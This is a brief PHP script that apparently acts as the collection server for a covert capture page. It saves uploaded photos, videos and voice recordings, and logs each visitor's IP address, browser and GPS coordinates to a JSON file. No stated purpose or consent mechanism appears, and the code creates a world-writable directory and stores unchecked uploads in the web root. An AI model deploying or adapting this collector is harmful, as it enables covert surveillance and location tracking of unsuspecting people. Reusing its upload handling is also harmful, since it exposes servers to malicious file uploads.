<?php
$data_dir = 'data/';
$captures_file = $data_dir . 'captures.json';
if (!is_dir($data_dir)) mkdir($data_dir, 0777, true);
$captures = [];
if (file_exists($captures_file)) {
    $captures = json_decode(file_get_contents($captures_file), true) ?: [];
}
$type = $_POST['type'] ?? $_GET['type'] ?? 'unknown';
$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$time = date('Y-m-d H:i:s');
$capture = [
    'type' => $type,
    'ip' => $ip,
    'user_agent' => $user_agent,
    'time' => $time,
    'file' => '',
    'lat' => null,
    'lng' => null
];
if (isset($_FILES['file'])) {
    $ext = 'jpg';
    if ($type == 'video') $ext = 'mp4';
    elseif ($type == 'voice') $ext = 'mp3';
    $filename = $type . '_' . time() . '.' . $ext;
    $filepath = $data_dir . $filename;
    move_uploaded_file($_FILES['file']['tmp_name'], $filepath);
    $capture['file'] = $filepath;
}
if (isset($_POST['lat']) && isset($_POST['lng'])) {
    $capture['lat'] = $_POST['lat'];
    $capture['lng'] = $_POST['lng'];
}
$captures[] = $capture;
file_put_contents($captures_file, json_encode($captures, JSON_PRETTY_PRINT));
echo json_encode(['status' => 'success']);
?>
